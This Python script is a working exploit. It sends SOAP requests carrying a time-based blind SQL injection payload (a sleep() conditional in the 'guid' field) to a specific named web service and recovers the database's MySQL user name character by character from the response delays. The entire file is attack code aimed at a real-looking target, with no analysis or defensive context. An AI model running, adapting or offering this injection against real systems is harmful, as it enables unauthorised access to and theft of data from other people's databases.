import time
import requests
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10',
           'Content-Type': 'application/xml'}
payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.-'
user = ''
stop = 0
for i in range(1, 34):
    for payload in payloads:
        xml = """<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <web:updateState soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n         <guid xsi:type="xsd:string">1'+concat("'",(select 0 from (select sleep(if(substring(lower(user()),%s,1)=char(%s),5,0)))v))+'</guid>\r\n         <state xsi:type="xsd:int">1</state>\r\n         <to xsi:type="xsd:string"></to>\r\n      </web:updateState>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>""" % (i, ord(payload))

        url = 'http://xs.ceair.com/webservice/esbmessage.php'
        try:
            start_time = time.time()
            req = requests.post(url, data=xml, headers=headers, verify=False, timeout=6)
            if req.status_code == 200 and time.time() - start_time > 5:
                user += payload
                print '\n[in progress]', user,
                break
            if payload == '-':
                stop = 1
        except:
            pass
    if stop:
        break
print '\n[Done] MySQL user is %s' % user
